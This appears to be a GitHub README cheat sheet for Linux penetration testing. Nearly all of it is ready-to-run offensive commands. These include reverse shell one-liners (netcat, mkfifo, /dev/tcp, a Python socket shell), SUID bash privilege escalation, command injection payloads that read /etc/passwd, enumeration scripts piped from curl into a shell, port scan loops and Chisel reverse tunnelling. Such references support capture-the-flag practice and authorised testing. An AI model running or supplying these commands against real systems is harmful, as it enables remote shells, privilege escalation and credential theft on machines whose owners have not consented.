<picture>
    <source height="100px" srcset="https://user-images.githubusercontent.com/22857002/173634286-1909c4f2-729b-46bd-960b-60368df75400.svg#gh-dark-mode-only" media="(prefers-color-scheme: dark)">
    <img height="100px" src="https://user-images.githubusercontent.com/28403617/172728126-5dc238f3-9491-415b-a5f6-bedbb62d01cd.svg#gh-light-mode-only">
</picture>

---

- [Command Injection](#command-injection)
- [Enumeration](#enumeration)
- [FTP](#ftp)
- [Gdbserver](#gdbserver)
- [Network](#network)
- [Port Forwarding](#port-forwarding)
- [Privilege Escalation](#privilege-escalation)
- [Reverse Shell](#reverse-shell)
- [SCP](#scp)
- [Sudo](#sudo)

# Sudo
```bash
sudo -l
```

# Enumeration
## Script
### LinPeas
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Linux Smart Enumeration
```bash
curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh
chmod +x lse.sh
./lse.sh -l1
```

### Metasploit
```bash
msfconsole -q -x 'use exploit; set RHOSTS ip; set RPORT port; run; exit'
```

### Docker
```bash
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O
```

## File
### Classic
- `/etc/passwd`  &  `/etc/shadow`
- `/www/html` ꞏ `/var/www` ꞏ `/srv/html` ꞏ `/usr/share/*`
- `/home/user/.ssh`
- `/etc/cron.d`
- `/opt/`
- `/usr/local/bin`
- `/etc/nginx/sites-available/default`
- `/etc/apache2/sites-enabled/000-default.conf`

### Proc
`/proc/` contains useful information about the processes that are currently running

| directory	          | description                                     |
|---------------------|-------------------------------------------------|
| `/proc/PID/cmdline` | Command line arguments.                         |
| `/proc/PID/cwd`     | Link to the current working directory.          |
| `/proc/PID/environ` | Values of environment variables.                |
| `/proc/PID/exe`     | Link to the executable of this process.         |
| `/proc/PID/fd`      | Directory, which contains all file descriptors. |

### Command
```bash
find / -user user 2>&-
find / -group group 2>&-
find / -user root -executable -type f 2>&- | grep -v /bin/
```

```bash
/sbin/getcap -r *
```

# Reverse Shell
### Server
```bash
nc -lp 4444
```

### reSH
```bash
# Client
resh ip 4444
# Server
resh 4444
```
[Source](/scripts/resh.py)

### Netcat
```bash
nc ip 4444 -e /bin/bash
```

### Mkfifo
```bash
mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
```

### Dev 
```bash
bash -c 'bash -i >& /dev/tcp/ip/4444 0>&1'"
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### TTY Support
```bash
bash -i
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
script -qc /bin/bash /dev/null
```

*[source](https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md)*

# Privilege Escalation
```bash
/bin/cp /bin/bash /tmp/bash_up; /bin/chown user:group /tmp/bash_up; chmod g+s /tmp/bash_up; chmod u+s /tmp/bash_up
/tmp/bash_up -p
```

```bash
chmod 4755 /bin/bash
bash -p
```

# FTP
> *Port: 21*
> 
> File transfer protocol (FTP) is an Internet tool provided by TCP/IP. It helps to transfer files from one computer to another by providing access to directories or folders on remote computers 

### Scan
```bash
nmap --script ftp-* -p 21 ip
```

### Download all files
```bash
wget -m --user=user --password=fpassword ftp://ip
```
```bash
wget -m --user=anonymous --password=anonymous ftp://ip
```

# Gdbserver
> *Port: 1337*
>
> Gdbserver is a computer program that makes it possible to remotely debug other programs.
> You need to have a copy of the program you want to debug put onto the target system.

```
$ gdb
(gdb) target extended-remote ip:port
(gdb) remote get remote_file local_file
(gdb) remote put local_file remote_file
```

# Command Injection
```bash
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd;
; cat /etc/passwd ;
$(cat /etc/passwd)
`cat /etc/passwd`
&& cat /etc/passwd &&
|| cat /etc/passwd ||
< <(cat /etc/passwd)
| cat /etc/passwd
"; cat /etc/passwd "
```
[GTFOBins - Bypass  local security restrictions](https://gtfobins.github.io/)

# Network
### Netstat
```bash
netstat -tulpn
```

### Scan Port
```bash
for port in {1..65535}; do echo > /dev/tcp/ip/$port && echo "$port open"; done 2>/dev/null
```

### Scan Ip
```bash
for i in {1..254}; do (ping -c 1 192.168.1.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```

# Port Forwarding
### Chisel

```bash
# Install chisel
curl https://i.jpillora.com/chisel! | bash
```

```bash
# Example: 8000 -> 4444

# Attacker machine:
chisel server -p 4444 --reverse

# Victim machine:
chisel client ip-server:4444 R:8000:127.0.0.1:8000
```

### SSH
```sh
ssh -L 8080:127.0.0.1:8080 user@ip
```

# SCP
### Download File
```
scp -P port user@192.168.1.ip:path .
```

### Upload File
```
scp -P port file user@192.168.1.ip:path
```

### Upload peda
```
scp -P 22 -r ~/.peda user@192.168.1.ip:/tmp/peda
```
